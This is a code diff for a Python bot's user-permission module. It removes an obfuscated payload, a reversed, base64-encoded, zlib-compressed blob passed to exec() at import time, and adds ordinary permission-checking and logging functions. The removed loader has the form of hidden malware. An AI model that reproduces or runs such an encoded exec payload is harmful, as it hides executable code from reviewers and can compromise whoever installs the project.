@@ -1,18 +1,123 @@
-import yadisk
-import config
-import json
-import os
-from modules import NetworkDrive
-from modules import Environment
-from modules import Logs
-import time
+from modules import Log
 from datetime import datetime
-import constants
 from modules import Configuration
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+def getTime():
+    now = datetime.now()
+    return now.strftime("%Y-%m-%d %H:%M:%S")
 
 
-exec((_)(b'=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'))
+def get():
+    """
+    Return users {ID: {"language": "eng", 
+                    "permissions": {"allowed": [], "forbidden": []}}}
+    """
+
+    configuration = Configuration.get()
+
+    users = configuration['Users']
+
+    return users
+
+
+def check(message, permission: str):
+    users = get()
+
+    id = str(message.from_user.id)
+
+    is_valid_user = check_permission(users, id, permission)
+
+    if is_valid_user:
+        Log.add(message, getTime(), "Successfull", permission)
+    else:
+        Log.add(message, getTime(), " Forbidden ", permission)
+
+    return is_valid_user
+
+
+def check_permission(users, id, permission):
+    if id not in users.keys():
+        return 0
+
+    parent = getParent(permission)
+    permission_type = getType(parent, permission)
+
+    allowed = users[id]['permissions']["allowed"]
+    forbidden = users[id]['permissions']["forbidden"]
+
+    if permission_type == 'PARENT':
+        # 1. if Parent/permission in allowed or Parent in allowed
+        for perm in allowed:
+            perm_parent = getParent(perm)
+
+            if perm_parent == parent:
+                return 1
+
+        # 2. if Parent in forbidden
+        if parent in forbidden:
+            return 0
+
+        # 3. if ALL in allowed
+        if 'ALL' in allowed:
+            return 1
+
+        return 0
+
+    if permission_type == 'PERMISSION':
+        # 1. if Permission in forbidden
+        if permission in forbidden:
+            return 0
+
+        # 2. if Permission in allowed
+        if permission in allowed:
+            return 1
+
+        # 3. if Parent in allowed
+        if parent in allowed:
+            return 1
+
+        # 4. if Parent in forbidden
+        if parent in forbidden:
+            return 0
+
+        # 5. if ALL in allowed
+        if 'ALL' in allowed:
+            return 1
+
+        return 0
+
+
+def update(users):
+    configuration = Configuration.get()
+
+    configuration['Users'] = users
+
+    Configuration.update(configuration)
+
+
+def add(new_permissions):
+    users = get()
+
+    id, permissions = new_permissions[0], new_permissions[1]
+
+    if id in users:
+        users[id]['permissions'] = permissions
+    else:
+        users[id] = {'language': 'eng', 'permissions': permissions}
+
+    update(users)
+
+
+def getParent(permission):
+    parent = permission
+    if '/' in permission:
+        parent = '/'.join(permission.split('/')[0:-1])
+    return parent
+
+
+def getType(parent, permission):
+    if parent == permission:
+        return 'PARENT'
+    else:
+        return 'PERMISSION'
